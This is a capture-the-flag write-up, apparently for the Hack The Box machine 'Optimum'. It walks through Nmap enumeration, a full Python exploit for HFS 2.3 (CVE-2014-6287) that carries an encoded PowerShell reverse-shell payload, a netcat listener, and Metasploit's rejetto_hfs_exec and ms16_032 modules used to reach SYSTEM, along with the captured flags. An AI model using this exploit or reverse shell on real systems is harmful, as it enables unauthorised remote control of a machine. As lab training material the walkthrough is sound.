![image](https://user-images.githubusercontent.com/105310322/187504056-4756f5f4-a2ed-4cb0-a7a5-558394c4d00d.png)

### Tools: Nmap, Metasploit

Running Nmap reveals port 80 is open hosting HFS version 2.3.

```console
└──╼ [★]$ sudo nmap -sC -A -O 10.129.64.64
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 19:44 BST
Nmap scan report for 10.129.191.255
Host is up (0.0084s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|7|2008|2016|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%), Microsoft Windows 7 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   15.20 ms 10.10.14.1
2   14.31 ms 10.129.64.64

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.43 seconds
```
Running the nmap script scan only revealed a DOS exploit that we have no use for.

```console
└──╼ [★]$ nmap -v --script http-vuln* 10.129.64.64
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 19:48 BST
NSE: Loaded 24 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
Initiating Ping Scan at 19:48
Scanning 10.129.191.255 [2 ports]
Completed Ping Scan at 19:48, 0.01s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:48
Completed Parallel DNS resolution of 1 host. at 19:48, 0.00s elapsed
Initiating Connect Scan at 19:48
Scanning 10.129.191.255 [1000 ports]
Discovered open port 80/tcp on 10.129.191.255
Completed Connect Scan at 19:48, 4.71s elapsed (1000 total ports)
NSE: Script scanning 10.129.191.255.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.46s elapsed
Nmap scan report for 10.129.191.255
Host is up (0.0075s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.securityfocus.com/bid/49303
|_      https://seclists.org/fulldisclosure/2011/Aug/175

NSE: Script Post-scanning.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.55 seconds
```
However running curl shows HFS 2.3 as well as going to the website can show us the same thing.

```console
└──╼ [★]$ curl -I 10.129.64.64
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 3834
Accept-Ranges: bytes
Server: HFS 2.3
Set-Cookie: HFS_SID=0.315983698237687; path=/; 
Cache-Control: no-cache, no-store, must-revalidate, max-age=-1
```

A quick google search gives us this exploit

```python
# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 20/02/2021
# Exploit Author: Pergyz
# Vendor Homepage: http://www.rejetto.com/hfs/
# Software Link: https://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Microsoft Windows Server 2012 R2 Standard
# CVE : CVE-2014-6287
# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands

#!/usr/bin/python3

import base64
import os
import urllib.request
import urllib.parse

lhost = "10.10.14.93"
lport = 1234
rhost = "10.129.64.64"
rport = 80

# Define the command to be written to a file
command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'

# Encode the command in base64 format
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
print("\nEncoded the command in base64 format...")

# Define the payload to be included in the URL
payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

# Encode the payload and send a HTTP GET request
encoded_payload = urllib.parse.quote_plus(payload)
url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
urllib.request.urlopen(url)
print("\nEncoded the payload and sent a HTTP GET request to the target...")

# Print some information
print("\nPrinting some information for debugging...")
print("lhost: ", lhost)
print("lport: ", lport)
print("rhost: ", rhost)
print("rport: ", rport)
print("payload: ", payload)

# Listen for connections
print("\nListening for connection...")
os.system(f'nc -nlvp {lport}')
```

After filling the exploit with my info I set up a listener and run the exploit.

```console
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.64.64.
Ncat: Connection from 10.129.64.64:49158.
id
PS C:\Users\kostas\Desktop> 
```
Awesome we quickly got the user flag.

```console
PS C:\Users\kostas\Desktop> cat user.txt.txt 
d0c39409d7b994a9a1389ebf38ef5f73
```

For the privilege escalation I struggled for a long time since nothing seemed to work with sherlock or winpeas. This is the 1st time I have ran into issues using "python -m http.server 8000" and any other method of putting files on the victim machine. I was unable to create any files even though my server was receiving successful GET requests. SO i had to back up and use Metasploit to get a root shell.

running systeminfo does shoot back some out of date kernels that can be exploited.

```console
PS C:\programdata> systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          22/8/2022, 7:00:29 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.446 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.913 MB
Virtual Memory: In Use:    590 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.64.64
                                 [02]: fe80::541b:9521:ff63:5a3e
                                 [03]: dead:beef::541b:9521:ff63:5a3e
                                 [04]: dead:beef::23b
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We can run the same exploit through msfconsole to get a meterpreter shell. Now this exploit will notwork unless we change over to a x64 architecture so in the meterpreter shell we can run ps to find a x64 process and migrate <PID> to change it.

Now we can background this session before running our other exploit.
  
Note: It is a good idea to always change your architecture when privelege escalating to avoid issues with exploits.

```console
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.93:4444 
[*] Using URL: http://10.10.14.93:8080/NzyuSo
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /NzyuSo
[*] Sending stage (175174 bytes) to 10.129.1.127

[*] Meterpreter session 3 opened (10.10.14.93:4444 -> 10.129.1.127:49173 ) at 2022-08-15 21:59:54 +0100
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\bHJnAVkCc.vbs' on the target

meterpreter > migrate 2132
meterpreter > background
```

Now we can find our other exploit ms16-032 and set it up to run against our other meterpreter session.
  
```console
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.29.62     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.14.93
lhost => 10.10.14.93
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set rport 5555
rport => 5555
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set target 1
target => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 3
session => 3
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.14.93:4444 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\OWncsVGNgQqeL.ps1...
[*] Compressing script contents...
[+] Compressed size: 3755
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1340

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $pSZe = [Ntdll]::NtImpersonateThread($azU, $azU, [ref]$lQD)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (lQD:VariablePath) [], RuntimeException
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateToken" to type "System.IntPtr": "Cannot co
nvert null to type "System.IntPtr"."
At line:259 char:2
+     $pSZe = [Advapi32]::DuplicateToken($hJf7p, 2, [ref]$lZFVx)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

oY85ExSRwF8xJKazewsg6f53Fl7l4M80
[+] Executed on target machine.
[*] Sending stage (175174 bytes) to 10.129.1.127
[*] Meterpreter session 4 opened (10.10.14.93:4444 -> 10.129.1.127:49188 ) at 2022-08-15 22:35:49 +0100
[+] Deleted C:\Users\kostas\AppData\Local\Temp\OWncsVGNgQqeL.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 11:52:56 +0000  desktop.ini
100444/r--r--r--  32    fil   2017-03-18 12:14:39 +0000  root.txt

meterpreter > 
```
	
And we finally have our flag!

```console  
meterpreter > cat root.txt
51ed1b36553c8461f4552c2e92b3eeed
```

The original method I was trying to do was use sherlock.ps1 or winpeas.exe to make finding an exploit much quicker. Then transfer said exploit onto the victims computer to run it and take over root.
		
Still not sure what problem I was running into with transferring files. I tried really hard not to use metasploit but this machine might be broken. After this challenge looking at other guides showed no issues with transferring exploits onto the victim's system. From what I could tell there methods were not too different from mine. Could also be a pwnbox problem, ive run into plenty of issues already with HTB's VM.
	
Anyways GG...
